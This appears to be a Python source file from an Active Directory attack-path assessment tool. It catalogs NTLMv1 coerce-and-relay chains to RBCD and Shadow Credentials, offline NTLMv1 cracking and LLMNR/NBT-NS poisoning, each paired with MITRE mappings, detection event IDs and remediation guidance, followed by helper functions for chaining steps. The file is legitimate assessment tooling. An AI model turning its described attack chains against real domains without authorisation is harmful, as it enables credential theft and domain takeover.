    # ── NTLMv1 coerce→relay attack steps (sub-project #3) ─────────────────────
    # Surface marker: NTLMv1 enabled on a Computer. A finding on its own,
    # regardless of relay viability. Template: a context-only surface like the
    # CVE-scanner enablers. Not executed directly (the relay edges are).
    _entry(
        "Ntlmv1Enabled",
        support_kind="context",
        support_reason=(
            "NTLMv1 authentication is enabled on this host. Its challenge/response "
            "is trivially crackable and relayable; a discovered misconfiguration."
        ),
        compromise_semantics="context_only",
        compromise_effort="none",
        category="ntlm",
        description=(
            "NTLMv1 authentication enabled on the host (LmCompatibilityLevel < 3). "
            "The host's NTLMv1 response can be coerced and relayed or cracked to a "
            "machine NT hash."
        ),
        vuln_key="ntlmv1_enabled",
        remediation_complexity="low",
        remediation_effort=(
            "Disable NTLMv1 by setting LmCompatibilityLevel to 3 or higher via GPO "
            "(Network security: LAN Manager authentication level → "
            "'Send NTLMv2 response only. Refuse LM & NTLM')."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1556",
        mitre_technique_name="Modify Authentication Process",
        detection_event_ids=("4624",),
        bh_native=False,
        bh_cypher_names=("Ntlmv1Enabled",),
        remediation_steps=(
            "Audit LmCompatibilityLevel across the estate "
            "(reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel).",
            "Set 'Network security: LAN Manager authentication level' to "
            "'Send NTLMv2 response only. Refuse LM & NTLM' via GPO.",
            "Disable NTLMv1 fallback and monitor Event ID 4624 for "
            "Authentication Package = NTLM V1.",
        ),
    ),
    # RBCD relay: Domain Users → Ntlmv1RelayRBCD → Computer X. Joins the
    # admin-capability family (AdminTo / ReadLAPSPassword). access_capability_only
    # + NOT context-transparent → DumpLSA chains automatically (the S4U
    # Administrator ccache grants a real local-admin session). Template:
    # coerceandrelayntlmtoadcs (coerce/relay) + allowedtoact (RBCD semantics).
    _entry(
        "Ntlmv1RelayRBCD",
        support_kind="supported",
        support_reason=(
            "Coerce the NTLMv1 host, relay its authentication to the DC LDAP, write "
            "msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) for a controlled delegate, "
            "then S4U2Self+Proxy to mint an Administrator ticket on the victim. "
            "Executed natively via the relay handler."
        ),
        compromise_semantics="access_capability_only",
        compromise_effort="high",
        category="ntlm_relay",
        description=(
            "NTLMv1 coerce-and-relay to RBCD: a domain user coerces the victim "
            "computer, relays its NTLMv1 authentication to the DC, configures "
            "resource-based constrained delegation, and obtains local administrator "
            "access on the victim via S4U."
        ),
        vuln_key="ntlmv1_relay_rbcd",
        remediation_complexity="high",
        remediation_effort=(
            "Disable NTLMv1 (LmCompatibilityLevel ≥ 3) via GPO; enforce LDAP signing "
            "and channel binding (drop-the-MIC is blocked when signing is enforced); "
            "remove authentication-coercion vectors (disable vulnerable RPC services). "
            "Any one of these closes this avenue."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768", "4769", "5136"),
        bh_native=False,
        bh_cypher_names=("Ntlmv1RelayRBCD",),
        source_context_requirement="user_credentials",
        execution_target_access_requirement="computer_reachable",
    ),
    # Shadow Credentials relay: Domain Users → Ntlmv1RelayShadowCreds → Computer X.
    # Credential-granting (like ReadGMSAPassword): PKINIT yields the machine NT
    # hash directly → SHORTER path, no DumpLSA. credential_access_only →
    # provides credential_recovered, which does NOT satisfy DumpLSA's
    # local_admin_session requirement. Template: coerceandrelayntlmtoadcs +
    # HasShadowCredentials (Shadow Creds semantics).
    _entry(
        "Ntlmv1RelayShadowCreds",
        support_kind="supported",
        support_reason=(
            "Coerce the NTLMv1 host, relay its authentication to the DC LDAP, append "
            "msDS-KeyCredentialLink (Shadow Credentials), then PKINIT with the minted "
            "key to recover the victim machine NT hash directly. Requires ADCS PKI. "
            "Executed natively via the relay handler."
        ),
        compromise_semantics="credential_access_only",
        compromise_effort="high",
        category="ntlm_relay",
        description=(
            "NTLMv1 coerce-and-relay to Shadow Credentials: a domain user coerces the "
            "victim computer, relays its NTLMv1 authentication to the DC, writes a "
            "key credential, and recovers the victim's machine NT hash via PKINIT."
        ),
        vuln_key="ntlmv1_relay_shadowcreds",
        remediation_complexity="high",
        remediation_effort=(
            "Disable NTLMv1 (LmCompatibilityLevel ≥ 3); enforce LDAP signing and "
            "channel binding; harden ADCS/PKINIT (this avenue writes a key credential "
            "and needs the PKI). Any one of these closes this avenue."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768", "4769", "5136"),
        bh_native=False,
        bh_cypher_names=("Ntlmv1RelayShadowCreds",),
        source_context_requirement="user_credentials",
        execution_target_access_requirement="computer_reachable",
    ),
    # Offline NTLMv1 crack: Domain Users → CrackNTLMv1 → Computer X. The MOST
    # universal NTLMv1 technique — no relay target, no reflection/signing/CBT
    # dependency, works single-DC and against any machine account. ADscan can
    # coerce + capture the NTLMv1 challenge/response, but it does NOT perform the
    # offline crack: there is no crack.sh submission, DES rainbow-table, or GPU
    # (hashcat 14000) integration, so we cannot recover the machine NT hash on
    # our own. The step is therefore ``unsupported`` (capture-only) — it is
    # surfaced as a manual follow-up, not an automated capability. It models a
    # credential_access_only avenue so the graph reasons about it correctly, but
    # the operator must run the crack out-of-band.
    #
    # ``finding_basis="execution_outcome"``: unlike an ACL or a certificate
    # template, this edge records no misconfiguration ADscan read out of the
    # directory — the directory weakness behind it (NTLMv1 still negotiable) is
    # already reported on its own key, ``ntlmv1_enabled``. What this edge adds is
    # only the offline crack, and whether that crack lands is unknown until
    # someone runs it. So when its edges are all not-assessed there is nothing
    # observed left to report, and a separate open finding would bill the client
    # for the absence of a crack backend rather than for anything in their AD.
    _entry(
        "CrackNTLMv1",
        support_kind="unsupported",
        execution_determinism="probabilistic",
        finding_basis="execution_outcome",
        support_reason=(
            "The coerced host's NetNTLMv1 challenge/response is captured, then "
            "cracked offline to recover the machine account NT hash."
        ),
        compromise_semantics="credential_access_only",
        compromise_effort="high",
        category="ntlm_relay",
        description=(
            "NTLMv1 offline crack: a domain user coerces the victim computer, captures "
            "its NTLMv1 response, and cracks it offline to recover the victim's machine "
            "account NT hash. The most universal NTLMv1 avenue, independent of relay "
            "viability, LDAP signing, channel binding, ADCS, or DC count."
        ),
        vuln_key="ntlmv1_crack",
        remediation_complexity="high",
        remediation_effort=(
            "Disable NTLMv1 (LmCompatibilityLevel ≥ 3) via GPO and remove "
            "authentication-coercion vectors. Unlike the relay avenues, LDAP signing "
            "and channel binding do NOT mitigate this. Only disabling NTLMv1 itself "
            "closes it (the crack is offline)."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1187",
        mitre_technique_name="Forced Authentication",
        detection_event_ids=("4768", "4769"),
        bh_native=False,
        bh_cypher_names=("CrackNTLMv1",),
        source_context_requirement="user_credentials",
        execution_target_access_requirement="computer_reachable",
    ),
    # ── Broadcast name-resolution poisoning → NetNTLMv2 capture → offline crack ──
    # Source is the UNAUTHENTICATED_PRINCIPAL: no credential is held. An attacker
    # sitting on the victim's L2 broadcast segment answers LLMNR / NBT-NS / mDNS
    # name lookups, captures the responding user's NetNTLMv2 challenge/response,
    # and recovers the account password by offline cracking. Distinct from the
    # NTLMv1 steps above by design:
    #   * NTLMv1 (CrackNTLMv1 / Ntlmv1Relay*) is higher likelihood/impact — the
    #     DES-based v1 response cracks near-instantly to the raw NT hash and is
    #     pass-the-hash / silver-ticket capable without recovering the plaintext.
    #     Those steps keep their own entries + vuln_keys; do NOT fold v1 here.
    #   * This step is NETNTLMv2-specific: it must be cracked back to the
    #     cleartext password before it is usable (no PtH from a v2 response), so
    #     it materializes ONLY on crack success (a proven, usable credential),
    #     never on bare capture — the capture on its own is the LLMNR/NBT-NS
    #     poisoning FINDING, materialized separately.
    # source_context_requirement="none" — like asreproasting/timeroasting, the
    # technique needs no prior credential. compromise_semantics =
    # direct_target_compromise: a cracked user NetNTLMv2 IS that user (same as a
    # cracked AS-REP), so the edge terminates on the compromised principal.
    _entry(
        "PoisonCaptureNtlmv2Crack",
        support_kind="supported",
        execution_determinism="probabilistic",
        support_reason=(
            "A rogue name-resolution service on the victim's local broadcast segment "
            "answered a lookup, captured the victim user's NetNTLMv2 authentication, "
            "and recovered the account password through offline cracking — yielding a "
            "usable domain credential from an unauthenticated position."
        ),
        compromise_semantics="direct_target_compromise",
        compromise_effort="high",
        source_context_requirement="none",
        category="credential_access",
        description=(
            "Broadcast name-resolution poisoning to NetNTLMv2 capture and offline "
            "crack: an unauthenticated attacker on the same local network segment as "
            "the victim answers LLMNR, NBT-NS, and mDNS name-resolution requests with "
            "a rogue address, causing the victim to authenticate to the attacker. The "
            "captured NetNTLMv2 challenge/response is then cracked offline to recover "
            "the user's cleartext password, converting a wire capture into a usable "
            "domain credential without any prior access."
        ),
        vuln_key="smb_relay_targets",
        remediation_complexity="low",
        remediation_effort=(
            "Disable multicast and broadcast name resolution so there is nothing to "
            "poison: turn off LLMNR (GPO: Computer Configuration → Administrative "
            "Templates → Network → DNS Client → 'Turn off multicast name resolution' "
            "= Enabled) and disable NetBIOS over TCP/IP (NBT-NS) on all interfaces "
            "via DHCP option 001 or per-adapter configuration. Enforce a strong "
            "password policy so any captured response cannot be cracked offline."
        ),
        can_fully_mitigate=True,
        mitre_technique_id="T1557.001",
        mitre_technique_name=(
            "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay"
        ),
        detection_event_ids=("4624", "4648"),
        bh_native=False,
        bh_cypher_names=("PoisonCaptureNtlmv2Crack",),
        execution_target_access_requirement="none",
    ),
)


# ── Credential-context helpers ────────────────────────────────────────────────

_SEMANTICS_TO_PROVIDES: dict[str, str] = {
    "direct_target_compromise": "credential_recovered",
    "access_capability_only":   "local_admin_session",
    "context_only":             "none",
    "credential_access_only":   "credential_recovered",
    "other":                    "none",
}

_CONTEXT_COMPAT: dict[str, frozenset[str]] = {
    # user_credentials intentionally does NOT satisfy local_admin_session:
    # AdminTo / CanPSRemote produce a session, not credentials, so they
    # cannot chain directly into dump-type edges (DumpLSASS, DumpLSA, DumpDPAPI etc.).
    "user_credentials":     frozenset({"user_credentials", "none"}),
    "credential_recovered": frozenset({"user_credentials", "none", "machine_credential"}),
    "local_admin_session":  frozenset({"local_admin_session", "none"}),
    # An established XpCmdshell RCE channel on the SQL host. Only the MSSQL
    # SYSTEM-escalation follow-ups require it; nothing "credential-recovered" is
    # produced by the RCE alone, so it satisfies only its own requirement (plus
    # the always-satisfiable "none"). Mirrors the local_admin_session pattern:
    # a session, not credentials.
    "mssql_rce_session":    frozenset({"mssql_rce_session", "none"}),
    "none":                 frozenset({"none"}),
}


def provides_context_from_semantics(compromise_semantics: str) -> str:
    """Return the credential context produced by an edge with the given semantics.

    Derived from the existing ``compromise_semantics`` field — no new catalog
    annotation required for most edges.
    """
    return _SEMANTICS_TO_PROVIDES.get(str(compromise_semantics or ""), "none")


def edges_chain_compatible(
    prev_compromise_semantics: str | None,
    next_source_context_requirement: str,
) -> bool:
    """Return True when an edge may immediately follow another in a DFS path.

    Args:
        prev_compromise_semantics: The ``compromise_semantics`` of the previous
            edge, or ``None`` when the next edge is the first in a path
            (implicit ``user_credentials`` at path start).
        next_source_context_requirement: The ``source_context_requirement`` of
            the candidate next edge.
    """
    if prev_compromise_semantics is None:
        provides = "user_credentials"
    else:
        provides = _SEMANTICS_TO_PROVIDES.get(str(prev_compromise_semantics or ""), "none")
    allowed = _CONTEXT_COMPAT.get(provides, frozenset())
    return next_source_context_requirement in allowed


def provides_context_for_entry(entry: AttackStepCatalogEntry) -> str:
    """Return the credential/session context an edge PRODUCES for the next edge.

    Prefers the explicit per-edge ``provides_context`` override (set only where the
    semantics-derived context is too coarse — e.g. ``XpCmdshell`` →
    ``mssql_rce_session``); otherwise falls back to the context derived from
    ``compromise_semantics``.  Keeping the fallback means every existing edge is
    unchanged; only edges that set the override differ.
    """
    if entry.provides_context:
        return entry.provides_context
    return provides_context_from_semantics(entry.compromise_semantics)


def context_requirement_satisfied(
    prev_provides: str | None,
    next_source_context_requirement: str,
) -> bool:
    """Return True when an edge PROVIDING ``prev_provides`` may be immediately
    followed by an edge REQUIRING ``next_source_context_requirement``.

    Unlike :func:`edges_chain_compatible` (which maps ``compromise_semantics`` →
    provides internally, so it cannot honour a per-edge ``provides_context``
    override), this takes the already-resolved produced context directly — the DFS
    resolves it via :func:`provides_context_for_entry` so the ``XpCmdshell`` →
    ``mssql_rce_session`` override is respected.

    ``prev_provides is None`` means the start of a path (or an all-transparent
    prefix), which implicitly provides ``user_credentials``.
    """
    provides = "user_credentials" if prev_provides is None else prev_provides
    allowed = _CONTEXT_COMPAT.get(provides, frozenset())
    return next_source_context_requirement in allowed


# ── Carry-forward host-session grants ─────────────────────────────────────────
#
# The PRECISE session context a completed ACCESS edge grants on the host it lands
# on — used by the attack-path execution gate to carry a proven foothold into the
# next post-exploitation (``EdgeKind.DERIVED``) step of the SAME chain.
#
# This is DELIBERATELY finer than ``_SEMANTICS_TO_PROVIDES`` (which coarsely maps
# every ``access_capability_only`` edge → ``local_admin_session`` so the DFS lets
# post-ex follow). For the carry-forward GATE the distinction matters: a SQL
# session is NOT a local-admin session, and a CanPSRemote/CanRDP shell runs as the
# acting user, not as admin. Keeping this table separate from the DFS provides map
# is what lets ``SQLAccess → DumpLSA`` be BLOCKED at the gate (a SQL session does
# not satisfy DumpLSA's ``local_admin_session`` requirement) without moving path
# discovery. The keys ARE the set of access edges whose success establishes a
# reusable host session; a relation absent here grants no carry-forward foothold.
_HOST_ACCESS_SESSION_GRANTS: dict[str, str] = {
    # Full local admin → LSASS / SAM / SYSTEM. Satisfies local_admin_session.
    "adminto": "local_admin_session",
    "hassession": "local_admin_session",
    # A SQL session that reaches OS command execution (once xp_cmdshell) — the
    # mssql_rce_session context the MSSQL SYSTEM-escalation follow-ups require. It
    # is NOT a local-admin session, so it does NOT satisfy the dump-type edges.
    "sqladmin": "mssql_rce_session",
    "sqlaccess": "mssql_rce_session",
    # A shell as the acting principal (WinRM / RDP / DCOM session). Satisfies a
    # user-context post-ex run (e.g. that user's own DPAPI blobs), NOT admin.
    "canpsremote": "user_credentials",
    "canrdp": "user_credentials",
    "executedcom": "user_credentials",
}


def access_session_grant_for_relation(relation: str) -> str | None:
    """Return the host-session context a completed ACCESS edge grants, or ``None``.

    ``None`` means the relation is not a session-granting access edge, so its
    success establishes no carry-forward foothold on the target host. Keyed
    punctuation-insensitively (a PascalCase ``AdminTo`` resolves to ``adminto``).
    """
    return _HOST_ACCESS_SESSION_GRANTS.get(_relation_lookup_key(relation))


def access_grant_satisfies_requirement(grant: str, requirement: str) -> bool:
    """Return whether a host session PROVIDING ``grant`` satisfies a consumer
    REQUIRING ``requirement``.

    Reuses the one context-compatibility SSOT (:data:`_CONTEXT_COMPAT`) that the
    DFS chain gate uses, so "does this access level cover this post-ex step" is
    answered exactly once. ``local_admin_session`` covers ``local_admin_session``
    (and ``none``); ``mssql_rce_session`` covers only its own; ``user_credentials``
    covers ``user_credentials`` / ``none`` — so ``AdminTo → DumpLSA`` allows and
    ``SQLAccess → DumpLSA`` blocks. A user-level session (CanPSRemote / CanRDP /
    ExecuteDCOM) satisfies a ``user_credentials`` post-ex step but NOT a dump-type
    edge (which requires ``local_admin_session``), because ADscan's dump routines
    read machine secrets off the host and genuinely need an admin session.
    """
    allowed = _CONTEXT_COMPAT.get(str(grant or ""), frozenset())
    return str(requirement or "") in allowed


def get_attack_step_catalog() -> tuple[AttackStepCatalogEntry, ...]:
    """Return all raw catalog entries as a tuple (pre-narrative-enrichment).

    Use this for validation and testing of catalog-level fields.
    For runtime lookups, use :data:`ATTACK_STEP_CATALOG` or
    :func:`get_attack_step_entry`.
    """
    return _CATALOG_ENTRIES


ATTACK_STEP_CATALOG: dict[str, AttackStepCatalogEntry] = {
    entry.relation: entry for entry in _CATALOG_ENTRIES if entry.relation
}

_RELATIONS_REQUIRING_EXECUTION_CONTEXT: frozenset[str] = frozenset(
    {
        "adminto",
        "sqlaccess",
        "sqladmin",
        "canrdp",
        "canpsremote",
        "hassession",
        "allowedtodelegate",
        "allowedtoact",
        "adcsesc1",
        "adcsesc3",
        "adcsesc4",
        "adcsesc8",
        "adcsesc11",
        "coerceandrelayntlmtoadcs",
        "dumplsa",
        "dumpdpapi",
        "genericall",
        "genericwrite",
        "forcechangepassword",
        "addself",
        "addmember",
        "readgmsapassword",
        "readlapspassword",
        "writedacl",
        "writeowner",
        "writespn",
        "spnjack",
        "writeaccountrestrictions",
        "owns",
        "dcsync",
        "kerberoasting",
        "writelogonscript",
    }
)
_RELATIONS_COUNTING_FOR_EXECUTION_READINESS: frozenset[str] = frozenset(
    _RELATIONS_REQUIRING_EXECUTION_CONTEXT | {"asreproasting"}
)
for _relation, _entry_value in list(ATTACK_STEP_CATALOG.items()):
    ATTACK_STEP_CATALOG[_relation] = replace(
        _entry_value,
        requires_execution_context=(
            _relation in _RELATIONS_REQUIRING_EXECUTION_CONTEXT
        ),
        counts_for_execution_readiness=(
            _relation in _RELATIONS_COUNTING_FOR_EXECUTION_READINESS
        ),
    )

_RELATION_ALIASES_BY_KEY: dict[str, str] = {
    # BloodHound CE ADCS relation variants.
    "adcsesc6a": "adcsesc6",
    "adcsesc6b": "adcsesc6",
    "adcsesc9a": "adcsesc9",
    "adcsesc9b": "adcsesc9",
    "adcsesc10a": "adcsesc10",
    "adcsesc10b": "adcsesc10",
    # Delegation relation names in CE.
    "allowedtoactonbehalfofotheridentity": "allowedtoact",
    # Writing msDS-AllowedToActOnBehalfOfOtherIdentity is the User-Account-
    # Restrictions property-set write the native collector emits as
    # WriteAccountRestrictions (the former standalone AddAllowedToAct edge was
    # consolidated into it).
    "addallowedtoactonbehalfofotheridentity": "writeaccountrestrictions",
    # KeyCredentialLink typo variants (BloodHound uses various spellings).
    "addkeycreatentiallink": "addkeycredentiallink",
    "addkeycredentiallinks": "addkeycredentiallink",
    # Account restriction property-set variants.
    "writeaccountrestriction": "writeaccountrestrictions",
    "writeaccountrestrictions": "writeaccountrestrictions",
    # MS17-010 alias.
    "ms17010": "ms17-010",
}


def _relation_lookup_key(relation: str) -> str:
    """Return a punctuation-insensitive key for relation lookup."""
    return re.sub(r"[^a-z0-9]+", "", str(relation or "").strip().lower())


@lru_cache(maxsize=None)
def normalize_relation(relation: str) -> str:
    """Normalize relation names for robust catalog lookups.

    Reads only the module-level ``_RELATION_ALIASES_BY_KEY`` (built once at
    import, never mutated) and ``_relation_lookup_key`` (a pure regex sub), so
    the output depends only on the single hashable ``str`` argument — safe to
    memoize across domains. The distinct relation set in a domain is small and
    bounded, so an unbounded cache is memory-safe.
    """
    raw = str(relation or "").strip().lower()
    if not raw:
        return ""
    alias = _RELATION_ALIASES_BY_KEY.get(_relation_lookup_key(raw))
    if alias:
        return alias
    return raw


def get_attack_step_entry(relation: str) -> AttackStepCatalogEntry | None:
    """Return one catalog entry by relation name.

    Falls back to a punctuation-insensitive match so a PascalCase BloodHound
    relation (e.g. ``MssqlLinkedServerLateral``) resolves to a snake_case catalog
    key (``mssql_linked_server_lateral``). ``normalize_relation`` only l-cases, so
    without this fallback the multi-word MSSQL entries could never be looked up by
    their emitted relation name. The secondary index has no key collisions
    (asserted by tests).
    """
    normalized = normalize_relation(relation)
    entry = ATTACK_STEP_CATALOG.get(normalized)
    if entry is not None:
        return entry
    return _CATALOG_BY_LOOKUP_KEY.get(_relation_lookup_key(normalized))


#: Per-step display statuses that a ``structural`` reclassification must NEVER
#: overwrite — a proven step, a safety abstention, an observed configuration
#: close, or an availability/support verdict always outranks ``structural``.
#: (Doctrine: ``structural`` applies ONLY when the step would otherwise be a
#: non-executed / theoretical context hop.)
_STRUCTURAL_PRESERVED_STATUSES: frozenset[str] = frozenset(
    {
        "success",
        "succeeded",
        "exploited",
        "domain_compromised",
        "partial",
        "blocked",
        "safety_blocked",
        "closed_by_configuration",
        "unavailable",
        "unsupported",
    }
)


def derive_step_display_status(relation: str, raw_status: object) -> object:
    """Return the per-step display status, upgrading a non-executed structural hop.

    A step whose edge is ``compromise_semantics="context_only"`` (MemberOf and the
    other structural / credential-reuse context pivots) is a FACT that requires no
    execution — it must render as ``structural``, never ``theoretical`` (which
    reads as a contradiction inside an exploited chain). This is the single source
    of truth for that reclassification; consumers (the display record / snapshot,
    the PDF, the web) read the baked ``structural`` status rather than
    re-deriving it per surface.

    Doctrine-guarded: the override applies ONLY when the step would otherwise be
    non-executed / theoretical. A proven step (``success`` / ``domain_compromised``),
    a safety abstention (``blocked`` / ``safety_blocked``), an observed config close
    (``closed_by_configuration``), or an availability/support verdict always
    outranks ``structural`` and is returned unchanged. A non-``context_only``
    relation is returned unchanged.

    Args:
        relation: The edge relation (BloodHound-style name, any casing).
        raw_status: The step's underlying status (may be ``None`` / empty).

    Returns:
        ``"structural"`` for a non-executed ``context_only`` step; otherwise
        ``raw_status`` unchanged.
    """
    status_key = str(raw_status or "").strip().lower()
    if status_key in _STRUCTURAL_PRESERVED_STATUSES:
        return raw_status
    entry = get_attack_step_entry(relation)
    if entry is not None and entry.compromise_semantics == "context_only":
        return "structural"
    return raw_status


# ── Credential-context lookups keyed by the punctuation-insensitive relation ──
# form the DFS emits (BloodHound PascalCase ``MssqlTokenTheftEscalation`` →
# ``mssqltokentheftescalation``).  Keyed the SAME way as ``get_attack_step_entry``'s
# secondary index so the underscored MSSQL entries resolve from their emitted
# relation label — otherwise the credential-context gate silently misses them and
# every MSSQL escalation defaults to ``user_credentials`` (the DarkZero ordering
# bug: the SYSTEM-escalation chained directly off the linked-server hop instead of
# after XpCmdshell).
_RELATION_PROVIDES_BY_LOOKUP: dict[str, str] = {
    _relation_lookup_key(e.relation): provides_context_for_entry(e)
    for e in _CATALOG_ENTRIES
    if e.relation
}
_RELATION_REQUIRES_BY_LOOKUP: dict[str, str] = {
    _relation_lookup_key(e.relation): e.source_context_requirement
    for e in _CATALOG_ENTRIES
    if e.relation
}


def provides_context_for_relation(relation: str) -> str | None:
    """Return the context an edge PRODUCES, resolved from its emitted relation label.

    Punctuation-insensitive so a PascalCase ``XpCmdshell`` resolves to the
    snake_case ``xp_cmdshell`` catalog key.  Returns ``None`` for an unknown
    relation so the caller can pick its own default.
    """
    return _RELATION_PROVIDES_BY_LOOKUP.get(_relation_lookup_key(relation))


def required_context_for_relation(relation: str) -> str:
    """Return the context an edge REQUIRES of its source, from its emitted label.

    Punctuation-insensitive (see :func:`provides_context_for_relation`).  Unknown
    relations default to ``user_credentials`` — the safest default (most edges).
    """
    return _RELATION_REQUIRES_BY_LOOKUP.get(
        _relation_lookup_key(relation), "user_credentials"
    )


def normalize_execution_relation(relation: str) -> str:
    """Return the canonical execution-family relation for one relation."""
    entry = get_attack_step_entry(relation)
    if entry and entry.execution_relation_alias:
        return entry.execution_relation_alias
    return normalize_relation(relation)


def list_attack_step_entries() -> list[AttackStepCatalogEntry]:
    """Return all catalog entries sorted by relation."""
    return [ATTACK_STEP_CATALOG[key] for key in sorted(ATTACK_STEP_CATALOG.keys())]


def get_relation_notes_by_support_kind(support_kind: SupportKind) -> dict[str, str]:
    """Return relation->reason map for one support kind.

    Keyed by BOTH the snake_case catalog key AND its punctuation-stripped lookup
    form (e.g. ``mssql_linked_server_lateral`` AND ``mssqllinkedserverlateral``).
    The execution engine looks these maps up by the raw BloodHound relation label
    lowercased (``step_action.lower()`` → ``mssqllinkedserverlateral``), which only
    matched catalog keys that happen to be punctuation-free (``memberof``,
    ``localadminpassreuse``). Underscored keys (``xp_cmdshell``,
    ``mssql_linked_server_lateral``, ``mssql_seimpersonate_escalation`` …) silently
    missed — so a context relation was NOT passed through and a supported relation
    hit the "unknown supported step" fallthrough. The stripped alias closes that
    gap for every relation; the punctuation-free keys are unchanged (alias == key).
    """
    out: dict[str, str] = {}
    for relation, entry in ATTACK_STEP_CATALOG.items():
        if entry.support_kind != support_kind:
            continue
        out[relation] = entry.support_reason
        out.setdefault(_relation_lookup_key(relation), entry.support_reason)
    return out


def relation_requires_execution_context(relation: str) -> bool:
    """Return whether a relation needs an execution credential context."""
    entry = get_attack_step_entry(normalize_execution_relation(relation))
    if entry is None:
        return False
    return bool(entry.requires_execution_context)


def relation_counts_for_execution_readiness(relation: str) -> bool:
    """Return whether a relation should gate attack-path readiness checks."""
    entry = get_attack_step_entry(normalize_execution_relation(relation))
    if entry is None:
        return False
    return bool(entry.counts_for_execution_readiness)


def relation_requires_reachable_computer_target(relation: str) -> bool:
    """Return whether a relation needs the target computer to be reachable now."""
    entry = get_attack_step_entry(normalize_execution_relation(relation))
    if entry is None:
        return False
    return entry.execution_target_access_requirement == "computer_reachable"


def is_probabilistic_step(relation: str) -> bool:
    """Return True when a step's success is crack/guess-gated (probabilistic).

    Probabilistic steps — Kerberoasting, AS-REP Roasting, password spraying, and
    any offline-crack / online-guess relation — succeed only if a recovered secret
    cracks or a guess lands, so trying MORE candidates raises the odds. Deterministic
    steps (writes, ACL edits, delegation primitives) succeed outright, so one is
    enough. Unknown relations default to deterministic (the conservative
    single-destructive-action choice).
    """
    entry = get_attack_step_entry(normalize_execution_relation(relation))
    if entry is None:
        return False
    return entry.execution_determinism == "probabilistic"


def finding_basis_for_relation(relation: str) -> FindingBasis:
    """Return what makes *relation* a client finding when it was not executed.

    See :data:`FindingBasis`. An unknown relation resolves to
    ``"observed_configuration"`` — the safe direction, because the alternative is
    silently dropping a real finding from the client's inventory.

    Args:
        relation: A graph edge's ``relation`` token, in any casing.

    Returns:
        ``"observed_configuration"`` or ``"execution_outcome"``.
    """
    entry = get_attack_step_entry(normalize_execution_relation(relation))
    if entry is None:
        return "observed_configuration"
    return entry.finding_basis


def get_exploitation_relation_vuln_keys() -> dict[str, str]:
    """Return relation->vuln_key mappings for exploitation-style classification."""
    return {
        relation: str(entry.vuln_key)
        for relation, entry in ATTACK_STEP_CATALOG.items()
        if isinstance(entry.vuln_key, str) and entry.vuln_key.strip()
    }


#: Built once at import — :func:`classify_edge_relation` runs per edge on every
#: graph save, so it must not rebuild the mapping on each call.
_EXPLOITATION_RELATION_VULN_KEYS: dict[str, str] = get_exploitation_relation_vuln_keys()


def classify_edge_relation(relation: str) -> tuple[str, str | None]:
    """Return the ``(category, vuln_key)`` an attack-graph edge carries.

    The single definition of what makes a graph edge *reportable*: an edge whose
    relation names a catalog technique is ``("exploitation", <vuln_key>)`` and is
    what :func:`~adscan_internal.services.attack_graph_findings.sync_attack_graph_findings`
    turns into a client finding; everything else is ``("relationship", None)``
    and only shapes attack paths.

    It lives here, on the catalog that already owns ``vuln_key``, so the two
    consumers that must never disagree can share it: the persistence seam that
    stamps the pair onto every edge before it reaches ``attack_graph.json``, and
    the derivation that reads the pair back off an edge written by an older
    build. Two graph writers once persisted edges without it, and noPac,
    PrintNightmare and the whole NTLMv1 family were invisible to the report of
    any scan whose workspace was never reopened.

    Args:
        relation: A graph edge's ``relation`` token, in any casing or punctuation.

    Returns:
        ``("exploitation", vuln_key)`` for a catalog technique that owns a
        ``vuln_key``, else ``("relationship", None)``.
    """
    vuln_key = _EXPLOITATION_RELATION_VULN_KEYS.get(_relation_lookup_key(relation))
    if vuln_key:
        return "exploitation", vuln_key
    return "relationship", None


def ntlmv1_crack_support_for(account_type: str) -> str:
    """Return the ``CrackNTLMv1`` support classification for a captured account.

    A user account has a human-chosen password, so a captured NetNTLMv1
    challenge/response for that user is wordlist-crackable ("supported"). A
    machine account has a random DC-generated password, so only DES rainbow
    tables recover it ("unsupported" until an on-prem/VPS rainbow backend
    lands — see BACKLOG "NTLMv1 offline-crack capability"). The catalog's
    ``CrackNTLMv1`` entry keeps its static ``unsupported`` default (the
    coercion-relay, machine-targeted avenue); this helper is consulted at the
    crack-success materialization site to decide whether a SPECIFIC cracked
    principal should be recorded as an exploited (supported) edge instead.
    """
    return "supported" if account_type == "user" else "unsupported"


# ── BloodHound CE edge helpers ─────────────────────────────────────────────────


def get_bh_native_relations() -> frozenset[str]:
    """Return the set of catalog relation keys that exist natively in BH CE's graph.

    ADscan-custom relations (LocalAdminPassReuse, Timeroasting, DumpLSA, etc.)
    are excluded because they are not stored as edges in BloodHound.
    """
    return frozenset(
        rel for rel, entry in ATTACK_STEP_CATALOG.items() if entry.bh_native
    )


def get_bh_native_acl_cypher_names() -> frozenset[str]:
    """Return BH-native Cypher type names for ACL/ACE-derived edges.

    The catalog marks ACL semantics explicitly via ``is_acl_edge`` so Phase 2
    BloodHound queries and similar collection logic stay synchronized when new
    ACL-backed attack steps are added.
    """
    result: set[str] = set()
    for entry in ATTACK_STEP_CATALOG.values():
        if not entry.bh_native or not entry.is_acl_edge:
            continue
        result.update(entry.bh_cypher_names)
    return frozenset(result)


def get_bh_cypher_relation_types() -> tuple[str, ...]:
    """Return BH CE Cypher relationship type names for all catalog entries that have them.

    Includes both BH-native edges and ADscan opengraph edges (e.g. Kerberoasting,
    ASREPRoasting, PasswordSpray, UserAsPass, BlankPassword, ComputerPre2k)
    that ADscan writes into BH CE via opengraph sync.

    Use this to build the ``[:TypeA|TypeB|...*1..N]`` filter in attack-path
    Cypher queries so the query is automatically kept in sync with the catalog.

    Returns a sorted, deduplicated tuple of PascalCase type strings.
    """
    result: list[str] = []
    for entry in ATTACK_STEP_CATALOG.values():
        if entry.bh_cypher_names:
            result.extend(entry.bh_cypher_names)
    return tuple(sorted(set(result)))


def get_bh_canonical_cypher_name(relation: str) -> str:
    """Return the canonical BH CE Cypher type name for a relation string.

    Handles variants like ``ADCSESC9`` → ``ADCSESC9a`` where BH CE splits a
    single ESC into multiple sub-types (a/b).  The first ``bh_cypher_name`` in
    the catalog entry is used as the canonical form.  If the relation is unknown
    or already canonical, the input is returned unchanged.

    Args:
